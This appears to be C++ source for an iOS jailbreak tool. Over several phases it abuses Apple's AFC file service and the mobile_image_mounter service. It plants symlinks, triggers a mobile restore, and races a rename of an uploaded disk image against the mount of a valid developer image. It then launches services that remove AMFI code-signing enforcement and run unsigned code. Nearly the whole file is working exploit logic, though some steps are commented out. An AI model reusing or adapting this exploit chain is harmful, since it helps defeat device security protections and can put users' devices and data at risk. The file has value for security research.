

NTSTATUS CreateExHelpi4(iOSDevice& Device, iOSAFC& afc)
{
    NTSTATUS status;

    status = afc.RemovePath(EX_HELP_PATH);
    if (status != kAFCSuccess && status != kAFCNotFoundError)
        return status;

    status = afc.CreateDirectory(EX_HELP_PATH EX_HELP_LINK);
    if (status != kAFCSuccess)
        return status;

    AFCFileRef Handle;

    status = afc.OpenFile(EX_HELP_PATH EX_HELP_TARGET, AFC_FOPEN_RW, &Handle);
    if (status != kAFCSuccess)
        return status;

    status = afc.CloseFile(Handle);
    if (status != kAFCSuccess)
        return status;

    status = afc.LinkPath(AFC_LINK_SOFT_LINK, EX_HELP_LINK_RELATIVE, EX_HELP_PATH EX_HELP_LINK L"/c");
    if (status != kAFCSuccess)
        return status;

    return status;
}

NTSTATUS CreateMvHelpi4(iOSDevice& Device, iOSAFC& afc)
{
    NTSTATUS status;

    status = afc.RemovePath(MV_HELP_PATH);
    if (status != kAFCSuccess && status != kAFCNotFoundError)
        return status;

    status = afc.CreateDirectory(MV_HELP_PATH MV_HELP_LINK);
    if (status != kAFCSuccess)
        return status;

    AFCFileRef Handle;

    status = afc.OpenFile(MV_HELP_PATH MV_HELP_TARGET, AFC_FOPEN_RW, &Handle);
    if (status != kAFCSuccess)
        return status;

    status = afc.CloseFile(Handle);
    if (status != kAFCSuccess)
        return status;

    status = afc.LinkPath(AFC_LINK_SOFT_LINK, MV_HELP_LINK_RELATIVE, MV_HELP_PATH MV_HELP_LINK L"/c");
    if (status != kAFCSuccess)
        return status;

    return status;
}

NTSTATUS MountImage(iOSDevice& device, iOSAFC& afc1, const String& mloadInputPath)
{
    NTSTATUS        status;
    AFCFileRef      input;
    iOSService      imgmounter(device);

    imgmounter.Start("com.apple.mobile.mobile_image_mounter");

    DebugLog(L"create mload");
    status = afc1.CreateDirectory(MOUNT_DMG_PATH);

    DebugLog(L"delete mload/input");
    status = afc1.RemovePath(MOUNT_INPUT_DMG_PATH);

    DebugLog(L"mloadInput");
    // if (0)
    {
        NtFileMemory mloadInput;

        mloadInput.Open(mloadInputPath);

        status = afc1.OpenFile(MOUNT_INPUT_DMG_PATH, AFC_FOPEN_WRONLY, &input);
        if (status != kAFCSuccess)
            return status;

        status = afc1.WriteFile(input, mloadInput, mloadInput);
        if (status != kAFCSuccess)
            return status;

        status = afc1.CloseFile(input);
        if (status != kAFCSuccess)
            return status;
    }

    LOOP_ONCE
    {
        AFCDirectory mload;
        NtFileMemory validdmg;

        validdmg.Open(L"data/valid.dmg");

        DebugLog(L"UploadImage");
        SendFileMessage(imgmounter, L"data/UploadImage.plist");
        imgmounter.SendRawData(validdmg, validdmg);

        CFDictionary ReceiveBytesAck = (CFDictionaryRef)imgmounter.ReceiveMessage();

        DebugLog(L"ReceiveBytesAck1");
        if (CFStringCompare((CFStringRef)CFDictionaryGetValue(ReceiveBytesAck, CFSTR("Status")), CFSTR("ReceiveBytesAck"), 0) != kCFCompareEqualTo)
            return kAMDInvalidResponseError;

        DebugLog(L"read dmg");
        status = afc1.OpenDirectory(MOUNT_DMG_PATH, &mload);
        if (status != kAFCSuccess)
            return status;

        String dmg;

        do
        {
            status = afc1.ReadDirectory(mload, dmg);
            DebugLog(L"%s", dmg);

            if (dmg.EndsWith(L".dmg"))
                break;

        } while (status == kAFCSuccess && dmg);

        afc1.CloseDirectory(mload);

        if (!dmg)
        {
            DebugLog(L"UploadImage failed");
            return kAMDUndefinedError;
        }

        String newDmg = MOUNT_DMG_PATH;
        newDmg += L"/";
        newDmg += dmg;

        Ps::Sleep(5000);

        // HANDLE mountThread, renameThread;
        // HANDLE event;

        // event = CreateEventW(nullptr, TRUE, FALSE, nullptr);

        // Ps::CreateThreadT(
        //     [&](PVOID)
        //     {
        //         NtWaitForSingleObject(event, FALSE, nullptr);

        //         DebugLog(L"MountImage");
        //         SendFileMessage(imgmounter, L"data/MountImage.plist");

        //         CFObject response = imgmounter.ReceiveMessage();

        //         return 0;
        //     },
        //     nullptr,
        //     FALSE,
        //     CurrentProcess,
        //     &mountThread
        // );

        // Ps::CreateThreadT(
        //     [&](PVOID)
        //     {
        //         NTSTATUS status;

        //         NtWaitForSingleObject(event, FALSE, nullptr);

        //         Ps::Sleep(10);

        //         status = afc1.RenamePath(MOUNT_INPUT_DMG_PATH, newDmg);
        //         DebugLog(L"rename %p", status);

        //         return 0;
        //     },
        //     nullptr,
        //     FALSE,
        //     CurrentProcess,
        //     &renameThread
        // );

        // Ps::Sleep(200);

        // NtSetEvent(event, nullptr);

        // NtWaitForSingleObject(mountThread, FALSE, nullptr);
        // NtWaitForSingleObject(renameThread, FALSE, nullptr);

        // NtClose(mountThread);
        // NtClose(renameThread);
        // NtClose(event);

        // DebugLog(L"wait for mounting");
        // Ps::Sleep(5000);

        // afc1.RemovePath(newDmg);
        // afc1.RemovePath(MOUNT_INPUT_DMG_PATH);

        // break;

        DebugLog(L"MountImage");
        SendFileMessage(imgmounter, L"data/MountImage.plist");
        //Ps::Sleep(10);
        // afc1.RenamePath(newDmg, L"Books/Purchases/mload/input2");
        status = afc1.RenamePath(MOUNT_INPUT_DMG_PATH, newDmg);
        DebugLog(L"rename %p", status);

        ReceiveBytesAck = (CFDictionaryRef)imgmounter.ReceiveMessage();

        DebugLog(L"Complete");
        if (CFStringCompare((CFStringRef)CFDictionaryGetValue(ReceiveBytesAck, CFSTR("Status")), CFSTR("Complete"), 0) != kCFCompareEqualTo)
            return kAMDInvalidResponseError;

        //
        // MobileStorageMounter[193] <Error>: 0x381189dc handle_mount_disk_image: A disk image of type Developer is already mounted
        //

        DebugLog(L"wait for mounting");
        Ps::Sleep(5000);

        afc1.RemovePath(MOUNT_INPUT_DMG_PATH);
        // afc1.RemovePath(L"Books/Purchases/mload/input2");
        afc1.RemovePath(newDmg);
    }

    return status;
}

NTSTATUS JB_Phase1(iOSDevice& device)
{
    NTSTATUS    status;
    iOSService  afcsvr1(device);
    iOSAFC      afc1;

    DebugLog(L"start com.apple.afc");
    afcsvr1.Start("com.apple.afc");

    DebugLog(L"open afc conn");
    afc1.CreateConnection(afcsvr1);

    afc1.RemovePath(INSTALL_PATH);
    afc1.RemovePath(MOUNT_MMAP_PATH);
    afc1.CreateDirectory(MOUNT_MMAP_PATH);

    DebugLog(L"create exhelp");
    status = CreateExHelpi4(device, afc1);
    DebugLog(L"CreateExHelp: %p", status);
    if (status != kAFCSuccess)
        return status;

    DebugLog(L"create mvhelp");
    status = CreateMvHelpi4(device, afc1);
    DebugLog(L"CreateMvHelp: %p", status);
    if (status != kAFCSuccess)
        return status;

    DebugLog(L"request mobile restore");
    status = RequestRestore(device);
    if (status != kAMDSuccess)
        return status;

    DebugLog(L"request mobile restore end");

    DebugLog(L"clean up dirs");

    afc1.RemovePath(MV_HELP_PATH);
    afc1.RemovePath(EX_HELP_PATH);

    return status;
}

NTSTATUS JB_Phase2(iOSDevice& device)
{
    NTSTATUS    status;
    iOSService  afcsvr1(device);
    iOSAFC      afc1;

    DebugLog(L"start com.apple.afc");
    afcsvr1.Start("com.apple.afc");

    DebugLog(L"open afc conn");
    afc1.CreateConnection(afcsvr1);

    DebugLog(L"mloadInput");
    status = MountImage(device, afc1, L"data/armv7s_8.1.2.dmg");
    if (status != kAMDSuccess)
        return status;

    return status;

    Ps::Sleep(2000);

    DebugLog(L"mloadInput again");
    status = MountImage(device, afc1, L"data/armv7s_8.1.2.dmg");
    if (status != kAMDSuccess)
        return status;

    Ps::Sleep(2000);

    DebugLog(L"mloadInput3");
    status = MountImage(device, afc1, L"data/mloadInput3");
    if (status != kAMDSuccess)
        return status;

    Ps::Sleep(2000);

    DebugLog(L"remove mload");
    afc1.RemovePath(L"Books/Purchases/mload");

    return status;
}

NTSTATUS JB_Phase3(iOSDevice& device)
{
    NTSTATUS    status;
    iOSService  afcsvr(device);
    iOSService  mount_cache_1(device);
    iOSService  mount_lib_1(device);
    iOSService  remove_amfi(device);
    iOSService  load_amfi(device);
    iOSService  exec_u(device);
    iOSAFC      afc;

    DebugLog(L"start com.apple.afc");
    status = afcsvr.Start("com.apple.afc");
    if (status != kAMDSuccess)
        return status;

    DebugLog(L"start com.apple.mount_cache_1");
    status = mount_cache_1.Start("com.apple.mount_cache_1");
    if (status != kAMDSuccess)
        return status;

    DebugLog(L"start com.apple.mount_lib_1");
    status = mount_lib_1.Start("com.apple.mount_lib_1");
    if (status != kAMDSuccess)
        return status;

    DebugLog(L"start com.apple.remove_amfi");
    status = remove_amfi.Start("com.apple.remove_amfi");
    if (status != kAMDSuccess)
        return status;

    DebugLog(L"start com.apple.load_amfi");
    status = load_amfi.Start("com.apple.load_amfi");
    if (status != kAMDSuccess)
        return status;

    DebugLog(L"start com.apple.exec_u");
    status = exec_u.Start("com.apple.exec_u");
    if (status != kAMDSuccess)
        return status;

    status = afc.CreateConnection(afcsvr);

    LOOP_FOREVER
    {
        PAFCDictionary info;

        DebugLog(L"check libmis.dylib exist");
        if (afc.OpenFileInfo(L"install/libmis.dylib", &info) == kAFCSuccess)
        {
            afc.CloseKeyValue(info);
            break;
        }

        Ps::Sleep(1000);
    }

    iOSService umount_lib(device);
    iOSService umount_cache(device);

    return status;
}

VOID JailBreak(iOSDevice& Device)
{
    NTSTATUS status;

    if (Device.IsJailbroken() == kAMDSuccess)
    {
        DebugLog(L"device has been jailbroken");
        return;
    }

    DebugLog(L"device has not been jailbroken");

    if (Device.IsActivated() != kAMDSuccess)
    {
        DebugLog(L"device has not been activated");
        return;
    }

    DebugLog(L"device has been activated");

    status = JB_Phase1(Device);
    if (status != kAMDSuccess)
    {
        DebugLog(L"JB_Phase1 failed: %p", status);
        return;
    }


    Ps::Sleep(2000);

    iOSService syslog_relay(Device);

    // syslog_relay.Start("com.apple.syslog_relay");

    // CFObject syslog = syslog_relay.ReceiveMessage();

    // Ps::Sleep(INFINITE);

    status = JB_Phase2(Device);
    if (status != kAMDSuccess)
    {
        DebugLog(L"JB_Phase2 failed: %p", status);
        return;
    }

    return;

    LOOP_FOREVER
    {
        status = JB_Phase3(Device);
        if (status != kAMDSuccess)
        {
            DebugLog(L"JB_Phase3 failed: %p", status);

            if (status != kAMDInvalidServiceError)
                break;
        }

        Ps::Sleep(1000);
    }

    // Device.Restart();
}